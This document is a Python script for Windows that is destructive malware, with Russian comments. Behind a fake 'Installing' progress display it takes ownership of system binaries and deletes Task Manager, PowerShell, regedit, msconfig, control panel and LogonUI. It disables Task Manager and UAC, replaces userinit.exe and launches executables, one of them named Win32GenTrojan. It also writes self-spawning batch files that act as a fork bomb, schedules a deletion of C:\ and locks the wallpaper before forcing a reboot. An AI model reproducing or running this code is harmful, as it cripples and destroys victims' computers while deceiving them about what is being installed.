import os
import winreg as reg
from time import sleep
import shutil
import ctypes
import time
ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\ProgramData\Microsoft\Network\file.jpg" , 0)
logging = False
def fun():
  CreateFile(r"C:\ProgramData\WindowsSecurityLog\0x65\f1n.vbs", 
    "Set objShell = CreateObject(\"WScript.Shell\")\n" + 
    r'objShell.Run "cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n.bat", 0, False'
  )
  
  CreateFile(r"C:\ProgramData\WindowsSecurityLog\0x65\f1n.bat",
    "@echo off\n" +
    "start cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n_2.bat\n" +
    "start cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n_1.bat\n" 
  )
  CreateFile(r"C:\ProgramData\WindowsSecurityLog\0x65\f1n_1.bat",
    "@echo off\n" +
    "start cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n_2.bat\n" +
    "start cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n_1.bat\n" 
  )
  CreateFile(r"C:\ProgramData\WindowsSecurityLog\0x65\f1n_2.bat",
    "@echo off\n" +
    "start cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n_2.bat\n" +
    "start cmd --win32_process-runexec /c C:\ProgramData\WindowsSecurityLog\0x65\f1n_1.bat\n" 
  )
def af():
  os.system('cmd --win32_process-runexec /c takeown /f C:\\Windows\\System32\\takeown.exe')
  os.system('cmd --win32_process-runexec /c icacls C:\\Windows\\System32\\takeown.exe /c /grant "%username%":f')
  os.system('cmd --win32_process-runexec /c rename C:\\Windows\\System32\\takeown.exe teka.exe')
  os.system('cmd --win32_process-runexec /c teka /f C:\\Windows\\System32\\icacls.exe')
  os.system('cmd --win32_process-runexec /c icacls C:\\Windows\\System32\\icacls.exe /c /grant "%username%":f')
  os.system('cmd --win32_process-runexec /c rename C:\\Windows\\System32\\icacls.exe ica.exe')
  shutil.copyfile(r'C:\Windows\System32\wscript.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\wc.exe')
  Takeown(r"C:\Windows\System32\LogonUI.exe")
  shutil.copyfile(r'C:\Windows\System32\LogonUI.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\LogonUI.exe')
def CreateDir(paths):
  if (os.path.isdir(paths) == False):
    os.mkdir(paths)
 
  
def DirsCreate():
  CreateDir("C:\\ProgramData\\")
  CreateDir("C:\\ProgramData\\WindowsSecurityLog\\")
  CreateDir("C:\\ProgramData\\WindowsSecurityLog\\0x65\\")
  CreateDir("C:\\ProgramData\\WindowsSecurityLog\\0x65\\Temp\\")
def CreateFile(paths, inp):
  my_file = open(paths, "w+")
  my_file.write(inp)
  my_file.close()

def Takeown(path):
  os.system('cmd --win32_process-runexec /c teka /f "' + path + '"')
  os.system('cmd --win32_process-runexec /c ica "' + path + '" /c /grant "%username%":f')

def DeleteWithTakeown(file):
  if os.path.isfile(file):
    Takeown(file)
    os.system('cmd --win32_process-runexec /c copy "' + file + '"' + " C:\temp" + file)
    os.system('cmd --win32_process-runexec /c del /q /f "' + file + '"')
# ------------------------------
# ------------------------------
#       Создание файлов
# ------------------------------
# ------------------------------

  
def Files():
  CreateFile(
    "C:\\ProgramData\\WindowsSecurityLog\\0x65\\WindowsDefenderStartup.vbs",
    
    r'Set objShell = CreateObject("WScript.Shell")' + "\n" + 
    r'objShell.Run "C:\ProgramData\WindowsSecurityLog\0x65\windowsDefenderLib.exe --sysDefend --crashOnFind", 0, False' + "\n" + 
    r'WScript.Sleep(2000)' +"\n"+
    r'objShell.Run "C:\ProgramData\WindowsSecurityLog\0x65\WindowsAnalize.exe", 0, False' + "\n" + 
    r'objShell.Run "C:\ProgramData\WindowsSecurityLog\0x65\Win32DefenderUpdater.exe", 0, False' + "\n" + 
    r'objShell.Run "C:\Windows\py.exe C:\ProgramData\WindowsSecurityLog\0x65\timer.py", 0, False' +"\n" +
    r'objShell.Run "C:\Windows\py.exe C:\ProgramData\WindowsSecurityLog\0x65\winforms.py", 0, False' +"\n" +
    r'objShell.Run "C:\Windows\System32\wscript.exe C:\ProgramData\WindowsSecurityLog\0x65\TempRemove.vbs", 0, False' + "\n" +
    r'WScript.Sleep(360000)' +"\n"+
    r'objShell.Run "cmd --win32_process-runexec /c rd C:\", 0, False'
    
  )
  
  CreateFile(
    "C:\\ProgramData\\WindowsSecurityLog\\0x65\\TempRemove.vbs",
    
    r'Set oPlayer = CreateObject("WMPlayer.OCX")' +"\n"+
    r'oPlayer.URL = "C:\ProgramData\Microsoft\Network\1.mp3"' +"\n"+
    r'While True' +"\n"+
    r'  While oPlayer.playState <> 1' +"\n"+
    r'      WScript.Sleep 100' +"\n"+
    r'  Wend' +"\n"+
    r'  oPlayer.controls.play' +"\n"+
    r'Wend'
    
  )
  
  shutil.copyfile(r'C:\Windows\System32\taskkill.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\windowssecurbasex78.exe')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\FakeUserInit.exe', r'C:\Windows\System32\WinNT\userinit.exe')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\DisableUAC.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\DisableUAC.exe')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\windowsDefenderLib.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\windowsDefenderLib.exe')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\WindowsAnalize.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\WindowsAnalize.exe')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\time.py', r'C:\ProgramData\WindowsSecurityLog\0x65\timer.py')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\form1.py', r'C:\ProgramData\WindowsSecurityLog\0x65\winforms.py')
  shutil.copyfile(r'C:\ProgramData\Microsoft\Network\Win32GenTrojan.exe', r'C:\ProgramData\WindowsSecurityLog\0x65\Win32DefenderUpdater.exe')
  
def Delete():
  DeleteWithTakeown(r'C:\Windows\System32\taskkill.exe')
  DeleteWithTakeown(r'C:\Windows\System32\WindowsPowerShell')
  DeleteWithTakeown(r'C:\Windows\System32\taskmgr.exe')
  DeleteWithTakeown(r'C:\Windows\System32\perfmon.msc')
  DeleteWithTakeown(r'C:\Windows\System32\perfmon.exe')
  DeleteWithTakeown(r'C:\Windows\System32\mmc.exe')
  DeleteWithTakeown(r'C:\Windows\System32\msconfig.exe')
  DeleteWithTakeown(r'C:\Windows\System32\tasklist.exe')
  DeleteWithTakeown(r'C:\Windows\System32\mmc.exe')
  DeleteWithTakeown(r'C:\Windows\System32\reg.exe')
  DeleteWithTakeown(r'C:\Windows\System32\tskill')
  DeleteWithTakeown(r'C:\Windows\System32\regedt.exe')
  DeleteWithTakeown(r'C:\Windows\regedit.exe')
  DeleteWithTakeown(r'C:\Windows\System32\gpedit.msc')
  DeleteWithTakeown(r'C:\Windows\System32\control.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\taskkill.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\WindowsPowerShell')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\taskmgr.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\perfmon.msc')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\Takeown.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\icacls.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\perfmon.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\mmc.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\msconfig.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\tasklist.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\mmc.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\reg.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\regedit.exe')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\gpedit.msc')
  DeleteWithTakeown(r'C:\Windows\SysWOW64\control.exe')
  DeleteWithTakeown(r'C:\Windows\System32\LogonUI.exe')
  # Теперь это будет удалять тасккилл из системы
def Starts():
  os.system(r"C:\ProgramData\Microsoft\Network\DisableUAC.exe")
  os.system(r"cmd --win32_process-runexec /c C:\ProgramData\Microsoft\Network\1.bat")
  

def Registry():
  REG_HKLM = reg.HKEY_LOCAL_MACHINE

  
  #запрет диспетчера задач
  REG_HKCU = reg.HKEY_CURRENT_USER

  reg.CreateKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
  RegistryKey = reg.OpenKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,reg.KEY_ALL_ACCESS)

  reg.SetValueEx(RegistryKey,'DisableTaskMgr',0,reg.REG_DWORD, 0x0000001)
  reg.CloseKey(RegistryKey)

  # Замена фона рабочего стола 1

  reg.CreateKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
  RegistryKey = reg.OpenKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,reg.KEY_ALL_ACCESS)

  reg.SetValueEx(RegistryKey,'Wallpaper',0, reg.REG_SZ, r"C:\ProgramData\Microsoft\Network\file.png")

  reg.CloseKey(RegistryKey)

  # Замена фона рабочего стола 2

  reg.CreateKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
  RegistryKey = reg.OpenKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\System",0,reg.KEY_ALL_ACCESS)

  reg.SetValueEx(RegistryKey,'WallpaperStyle',0,reg.REG_SZ, "2")

  reg.CloseKey(RegistryKey)

  # Замена фона рабочего стола 3

  reg.CreateKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
  RegistryKey = reg.OpenKey(REG_HKCU,r"Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop",0,reg.KEY_ALL_ACCESS)

  reg.SetValueEx(RegistryKey,'NoChangingWallPaper',0,reg.REG_DWORD, 1)

  reg.CloseKey(RegistryKey)

  

def End():
  os.system("shutdown /r /t 0 /f")
  

os.system("cls")
print("Init.   Please wait")
sleep(1)
os.system("cls")
print("Init..   Please wait")
sleep(1)
os.system("cls")
print("Init...  Please wait")
sleep(1)
os.system("cls")
print("Init.   Please wait")
sleep(1)
os.system("cls")
print("Init..   Please wait")
sleep(1)
os.system("cls")
print("Init...  Please wait")
sleep(1)
os.system("cls")
print("Init.    Please wait")
sleep(1)
os.system("cls")
print("Init..   Please wait")

sleep(0.32)
os.system("cls")
print("Done!")
sleep(2)
os.system("cls")
print("Installing.")
sleep(1)
os.system("cls")
print("Installing..")
sleep(1)
os.system("cls")
print("Installing...")
sleep(1)
os.system("cls")
print("Installing.")

DirsCreate()


af()

Files()

Delete()
Registry()

    
fun()
Starts()
End()
